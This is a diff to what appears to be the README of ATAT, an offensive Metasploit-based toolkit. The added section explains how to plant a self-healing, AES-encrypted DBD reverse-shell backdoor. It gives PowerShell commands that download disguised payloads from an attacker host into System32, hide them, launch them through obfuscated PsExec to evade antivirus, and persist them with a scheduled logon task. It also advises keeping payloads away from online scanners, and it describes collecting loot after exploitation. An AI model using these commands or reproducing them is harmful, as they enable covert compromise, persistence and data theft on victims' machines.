@@ -124,7 +124,26 @@ OUTPUT FILES APPEND DATA DUE TO THE NATURE OF THESE LOOPED OPERATIONS; THEREFORE
 OPTION Dependency Checker:
 Dependencies option will attempt to install the required dependencies for ATAT. DBD Installer option must be run on your attacker box in order to receive DBD reverse shells.
 
-For post exploitation,
+OPTION Persistence:
+PLEASE DO NOT submit payloads generated to virustotal or any other online scanner!!
+DBD reverse shells will self heal a dropped connection in 10 minute intervals. If the connection is killed on either end or is lost for any reason, the connection will reconnect after a 10 minute period. All sessions are 128bit AES encrypted.
+
+WINDOWS:
+ATAT creates a taskmgnt.txt & winmgnt.txt for Windows DBD builder option payloads and places them in the /var/www/html/ directory before starting Apache on the attacker's machine (to host the payloads for access by the target machines). Both of these TXT files must be converted to EXE format once they have been transmitted to the target. Taskmgnt(nominally obfuscated PSEXEC) can be used to execute the winmgnt (DBD backdoor) so it is executed by a MS signed binary for more stealth/evasion. DBD itself is not currently flagged by any AV; but sometimes it is necessary to have your EXE run by a MS signed binary.
+Windows deployment instructions for reboot persistence:
+Now move the "taskmgnt.txt" & "winmgnt.txt" files to the target, rename & hide them, then launch backdoor with MS signed ofuscated PsExec.
+While this backdoor is self healing; it will not auto start at reboot. To get your shell back after a reboot, enter the following on the target (one command per line):
+powershell (new-object System.Net.WebClient).DownloadFile('http://<ATTACKER_IPADDRESS>/winmgnt.txt','%WINDIR%\System32\winmgnt.exe')
+powershell (new-object System.Net.WebClient).DownloadFile('http://<ATTACKER_IPADDRESS>/taskmgnt.txt','%WINDIR%\System32\taskmgnt.exe')
+attrib +H +S \"%WINDIR%\System32\winmgnt.exe\"
+attrib +H +S \"%WINDIR%\System32\taskmgnt.exe\"
+%WINDIR%\System32\taskmgnt.exe -i -d -s /accepteula %WINDIR%\System32\winmgnt.exe
+schtasks /create /sc onlogon /tn WindowsMgr /rl highest /tr \"%WINDIR%\System32\winmgnt.exe\"
+
+*NIX:
+ATAT creates a 'dbd' binary for *nix DBD builder option payloads and places it in the /var/www/html/ directory. 
+
+For post exploitation once you acquire sessions via ATAT,
 
 METHOD 1: 
 Launch your listener with menu option 2. ATAT will intelligently detect the appropriate post modules to run against each session you receive.  However, due to a bug in the MSF AutoRunScript feature you must do the following: From your listener window, after all of your sessions are in (after your attacks have completed) hit enter to drop down to your msf expoit(multi/handler)> prompt and then enter the following command without double quotes: "resource '/root/ATAT/ATAT_multi_post.rc'" Check your loot files in /root/.msf4/loot/
